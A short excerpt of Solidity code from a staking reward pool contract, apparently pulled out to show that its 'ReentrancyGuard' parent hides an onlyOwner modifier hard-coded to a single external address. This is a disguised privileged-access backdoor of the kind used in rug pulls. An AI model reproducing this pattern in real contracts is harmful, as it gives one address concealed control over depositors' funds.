...
contract xBlobGenesisRewardPool is ReentrancyGuard {
    ...
    uint256 public constant MAX_DEPOSIT_FEE = 0;
...
abstract contract ReentrancyGuard {
    ...
    modifier onlyOwner {
        require(address(0x7A9BF986bB14BFb32885D1eB73A3b890536301B9) == msg.sender, "operator: caller is not the operator");
        _;
    }
